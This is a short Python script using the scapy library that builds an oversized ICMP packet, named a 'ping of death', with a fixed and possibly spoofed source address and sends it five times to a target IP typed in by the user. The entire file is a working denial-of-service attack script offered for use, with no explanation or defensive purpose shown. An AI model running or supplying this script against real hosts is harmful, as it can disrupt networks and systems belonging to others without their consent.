from scapy.all import *

SOURCE_IP = "10.0.1.1"
TARGET_IP = input("Please enter target IP:")
MESSAGE = "X"
NUMBER_PACKETS = 5

pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
send(NUMBER_PACKETS*pingOFDeath)
